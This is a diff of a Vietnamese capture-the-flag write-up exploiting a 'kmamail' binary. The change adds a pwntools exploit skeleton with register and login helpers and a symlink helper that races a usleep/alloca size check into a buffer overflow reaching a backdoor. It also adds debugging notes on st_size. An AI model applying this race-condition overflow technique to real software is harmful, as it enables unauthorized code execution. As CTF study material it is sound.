@@ -123,7 +123,59 @@ void read_mail() {
 }
 ```
 - Lổ hổng lớn nhất chính là `usleep` và `alloca`, chương trình sẽ nhận return_val của alloca cho buf, nếu như ta thay đổi giá trị của buf tại thời điểm `usleep` => buffer overflow => đè vào RIP => nhảy tới backdoor 
+
 ### Primitive discovery
+
+- Khung xpl.py:
+
+```python
+from pwn import *
+import os, re, time, shutil
+
+context.binary = elf = ELF("./kmamail", checksec=False)
+
+gs = '''
+set pagination off
+b usleep
+run
+'''
+
+
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
+
+def mes(io, x): io.sendlineafter(b"> ", str(x).encode())
+
+def reg(io, name, passwd):
+    mes(io, 1)
+    io.sendlineafter(b"Username: ", name)
+    io.sendlineafter(b"Password: ", passwd)
+
+def login(io, name, passwd):
+    mes(io, 2)
+    io.sendlineafter(b"Username: ", name)
+    io.sendlineafter(b"Password: ", passwd)
+
+def put(path, data=None, link=None):
+    if os.path.lexists(path):
+        os.unlink(path)
+    if link:
+        os.symlink(link, path)
+    else:
+        open(path, "wb").write(data)
+
+def main():
+    if os.path.isdir("./data"):
+        shutil.rmtree("./data")
+
+    io = start()
+    name = b"huhu"
+    passwd = b"racecondition101"
+    mail = "./data/huhu/mail"
+```
 
 - Mình sử dụng 1 helper giúp tạo symlink và writedata dễ hơn: 
 
@@ -162,10 +214,14 @@ fopen("mail", "r");
    struct stat *st = malloc(sizeof(struct stat));
    ```
    
-   Từ đây ta có con trỏ *st
+   Từ đây ta có con trỏ *st 
 
 
    ![alt text](image-5.png)
+
+- Đoạn *st+0x10 chính là st_size.
+
+  ![alt text](image-6.png)
 
 - Ta có thể thấy, size hiện tại là 0xa, vì chuỗi mà chúng ta dùng là b"0123456789"
 
